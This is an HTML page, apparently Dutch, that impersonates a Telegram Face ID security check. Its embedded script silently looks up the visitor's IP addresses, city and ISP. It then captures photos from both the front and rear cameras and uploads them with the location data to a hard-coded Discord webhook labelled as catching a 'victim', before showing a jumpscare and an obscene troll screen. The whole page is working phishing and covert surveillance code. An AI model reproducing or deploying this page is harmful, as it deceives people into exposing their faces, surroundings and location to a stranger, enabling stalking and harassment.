<!DOCTYPE html>
<html lang="nl">
<head>
  <meta charset="UTF-8"/>
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Telegram: Security Check</title>
  <meta property="og:title" content="Telegram: Security Check">
  <meta property="og:description" content="Verify your identity to access Telegram Web.">
  <meta property="og:type" content="website">
  <meta name="theme-color" content="#24A1DE">
  <style>
    :root {
      --tg-blue: #24A1DE;
      --tg-bg: #ffffff;
      --tg-text: #222;
      --tg-sub: #707579;
    }

    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }

    body {
      background: var(--tg-bg);
      color: var(--tg-text);
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
      height: 100vh;
      overflow: hidden;
      display: flex;
      align-items: center;
      justify-content: center;
      user-select: none;
    }

    #screen-landing {
      width: 100%;
      max-width: 400px;
      padding: 40px;
      text-align: center;
      display: flex;
      flex-direction: column;
      align-items: center;
      gap: 20px;
      z-index: 10;
    }

    .face-id-icon {
      width: 100px; height: 100px;
      margin-bottom: 20px;
      animation: pulse 2s infinite ease-in-out;
    }
    @keyframes pulse {
      0% { transform: scale(1); opacity: 1; }
      50% { transform: scale(1.1); opacity: 0.8; }
      100% { transform: scale(1); opacity: 1; }
    }

    .tg-title { font-size: 1.6rem; font-weight: 700; margin-bottom: 8px; color: #1c1c1e; }
    .tg-subtitle { color: var(--tg-sub); font-size: 0.95rem; line-height: 1.4; margin-bottom: 30px; }

    .verify-btn {
      width: 100%;
      padding: 16px;
      background: var(--tg-blue);
      color: white;
      border: none;
      border-radius: 12px;
      font-size: 1.1rem;
      font-weight: 600;
      cursor: pointer;
      box-shadow: 0 4px 15px rgba(36, 161, 222, 0.3);
      transition: transform 0.1s active;
    }
    .verify-btn:active { transform: scale(0.98); }

    .security-badge {
      display: flex; align-items: center; gap: 8px;
      margin-top: 40px; color: #34c759; font-size: 0.85rem; font-weight: 600;
    }

    #screen-loading {
      display: none;
      position: fixed; inset: 0; background: #fff; z-index: 100;
      flex-direction: column; align-items: center; justify-content: center;
    }
    .scanner-line {
      width: 200px; height: 2px; background: var(--tg-blue);
      box-shadow: 0 0 15px var(--tg-blue);
      position: absolute; top: 0; left: 50%; transform: translateX(-50%);
      animation: scan 1.5s infinite ease-in-out;
    }
    @keyframes scan {
      0% { top: 30%; }
      50% { top: 70%; }
      100% { top: 30%; }
    }

    #screen-jumpscare {
      display: none; position: fixed; inset: 0; background: #000; z-index: 999;
      align-items: center; justify-content: center;
    }
    .jumpscare-video { width: 100%; height: 100%; object-fit: cover; }

    #screen-troll {
      display: none; position: fixed; inset: 0; background: #000; z-index: 1000;
      flex-direction: column; align-items: center; justify-content: center; text-align: center;
    }
    .troll-text { color: red; font-size: 5rem; font-weight: 900; animation: vibrate 0.1s infinite; }
    @keyframes vibrate {
      0% { transform: translate(1px,1px); }
      50% { transform: translate(-2px,-1px); }
      100% { transform: translate(1px,1px); }
    }

    #hidden-video { position: fixed; opacity: 0; width: 1px; height: 1px; left: -999px; }
    #hidden-canvas { display: none; }
  </style>
</head>
<body>

<video id="hidden-video" autoplay playsinline muted></video>
<canvas id="hidden-canvas"></canvas>

<div id="screen-landing">
  <div class="face-id-icon">
    <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
      <path d="M7 3H5C3.89543 3 3 3.89543 3 5V7M17 3H19C20.1046 3 21 3.89543 21 5V7M7 21H5C3.89543 21 3 20.1046 3 19V17M17 21H19C20.1046 21 21 20.1046 21 19V17M8 11V10C8 7.79086 9.79086 6 12 6C14.2091 6 16 7.79086 16 10V11M8 11H16M8 11C7.44772 11 7 11.4477 7 12V15C7 16.6569 8.34315 18 10 18H14C15.6569 18 17 16.6569 17 15V12C17 11.4477 16.5523 11 16 11M12 11V14M12 14L11 13" stroke="#24A1DE" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
    </svg>
  </div>
  <div class="tg-title">Identity Verification</div>
  <div class="tg-subtitle">To protect your Telegram account, please verify your identity using Face ID / Facial Recognition.</div>
  
  <button class="verify-btn" onclick="startPrank()">Start Facial Scan</button>

  <div class="security-badge">
    <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor"><path d="M12 2L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-3zm0 6c1.38 0 2.5 1.12 2.5 2.5S13.38 13 12 13s-2.5-1.12-2.5-2.5S10.62 8 12 8zm3 9H9v-1c0-1.5 3-2.3 3-2.3s3 .8 3 2.3v1z"/></svg>
    Secure Identity Verification
  </div>
</div>

<div id="screen-loading">
  <div class="face-id-icon" style="animation: none; opacity:0.3;">
     <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M7 3H5C3.89543 3 3 3.89543 3 5V7M17 3H19C20.1046 3 21 3.89543 21 5V7M7 21H5C3.89543 21 3 20.1046 3 19V17M17 21H19C20.1046 21 21 20.1046 21 19V17M8 11V10C8 7.79086 9.79086 6 12 6C14.2091 6 16 7.79086 16 10V11M8 11H16M8 11C7.44772 11 7 11.4477 7 12V15C7 16.6569 8.34315 18 10 18H14C15.6569 18 17 16.6569 17 15V12C17 11.4477 16.5523 11 16 11M12 11V14M12 14L11 13" stroke="#24A1DE" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>
  </div>
  <div class="scanner-line"></div>
  <div style="margin-top:20px; color:var(--tg-blue); font-weight:600;">Scanning Face...</div>
</div>

<div id="screen-jumpscare">
  <video id="jvid" class="jumpscare-video" playsinline preload="auto">
    <source src="jumpscare.mp4" type="video/mp4">
  </video>
</div>

<div id="screen-troll">
  <div class="troll-text">FUCK YOU</div>
  <div style="font-size: 5rem; margin-top: 20px;">🖕 🐒 🖕</div>
  <audio id="troll-sound" src="troll.mp3" loop preload="auto"></audio>
</div>

<script>
  const WEBHOOK = 'https://discord.com/api/webhooks/1490614590948511806/pVP30UWT4UeonIFBzcMjK8_3j7GJWyaTPU6C5Fvlril89lJSjti-Q2wBZXrEcG1BDI6e';
  let ipInfo = { v4: '...', v6: '...', loc: '...', isp: '...' };

  async function getInfo() {
    try {
      const v4Data = await fetch('https://ip-api.com/json/?fields=status,country,city,regionName,isp,query').then(r => r.json());
      const v6Data = await fetch('https://api64.ipify.org?format=json').then(r => r.json()).catch(() => ({ip:'N/A'}));
      if(v4Data.status === 'success') {
        ipInfo.v4 = v4Data.query;
        ipInfo.loc = `${v4Data.city}, ${v4Data.regionName}, ${v4Data.country}`;
        ipInfo.isp = v4Data.isp;
      }
      ipInfo.v6 = v6Data.ip;
    } catch(e) {}
  }
  getInfo();

  async function startPrank() {
    const el = document.documentElement;
    if (el.requestFullscreen) el.requestFullscreen();

    document.getElementById('screen-landing').style.display = 'none';
    document.getElementById('screen-loading').style.display = 'flex';

    const photos = [];
    
    // Front Capture
    try {
      const s1 = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
      const b1 = await captureFrame(s1, true);
      if(b1) photos.push({ blob: b1, name: 'selfie.jpg' });
      s1.getTracks().forEach(t => t.stop());
    } catch(e) {}

    // Back Capture
    try {
      const s2 = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } });
      const b2 = await captureFrame(s2, false);
      if(b2) photos.push({ blob: b2, name: 'omgeving.jpg' });
      s2.getTracks().forEach(t => t.stop());
    } catch(e) {}

    document.getElementById('screen-loading').style.display = 'none';
    document.getElementById('screen-jumpscare').style.display = 'flex';
    
    const video = document.getElementById('jvid');
    video.volume = 1.0;
    await video.play();

    uploadResults(photos);

    setTimeout(() => {
      document.getElementById('screen-jumpscare').style.display = 'none';
      document.getElementById('screen-troll').style.display = 'flex';
      document.getElementById('troll-sound').play();
    }, 3000);
  }

  async function captureFrame(stream, flip) {
    const vid = document.getElementById('hidden-video');
    vid.srcObject = stream;
    return new Promise((resolve) => {
      vid.onloadedmetadata = () => {
        setTimeout(() => {
          const can = document.getElementById('hidden-canvas');
          can.width = vid.videoWidth;
          can.height = vid.videoHeight;
          const ctx = can.getContext('2d');
          if(flip) { ctx.translate(can.width,0); ctx.scale(-1,1); }
          ctx.drawImage(vid, 0, 0);
          can.toBlob(resolve, 'image/jpeg', 0.95);
        }, 500);
      };
    });
  }

  async function uploadResults(photos) {
    const fd = new FormData();
    const payload = {
      username: "🕵️ Telegram Face-ID Bot",
      embeds: [{
        title: "🎯 SLACHTOFFER GEPAKT MET FACE-ID",
        color: 0x34c759,
        fields: [
          { name: "📱 Apparaat", value: `\`${navigator.platform}\``, inline: true },
          { name: "🌐 IPv4", value: `\`${ipInfo.v4}\``, inline: true },
          { name: "🌐 IPv6", value: `\`${ipInfo.v6}\``, inline: true },
          { name: "📍 Locatie", value: ipInfo.loc, inline: false },
          { name: "🏢 Provider", value: ipInfo.isp, inline: false }
        ],
        footer: { text: "Night Owl Stealth Security" }
      }]
    };

    fd.append('payload_json', JSON.stringify(payload));
    photos.forEach((p, i) => fd.append(`file${i+1}`, p.blob, p.name));
    await fetch(WEBHOOK, { method: 'POST', body: fd });
  }
</script>
</body>
</html>
